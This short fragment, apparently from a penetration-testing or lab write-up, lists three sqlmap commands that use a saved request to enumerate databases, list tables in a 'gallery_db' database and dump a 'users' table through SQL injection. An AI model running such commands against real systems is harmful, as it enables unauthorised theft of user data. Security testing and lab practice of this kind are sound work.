
## Enumerating Databases

```
sqlmap -r sql.req --batch -dbs
```

```
sqlmap -r sql.req --batch --dump users
```

```
sqlmap -r sql.req --batch --database gallery_db --tables users
```
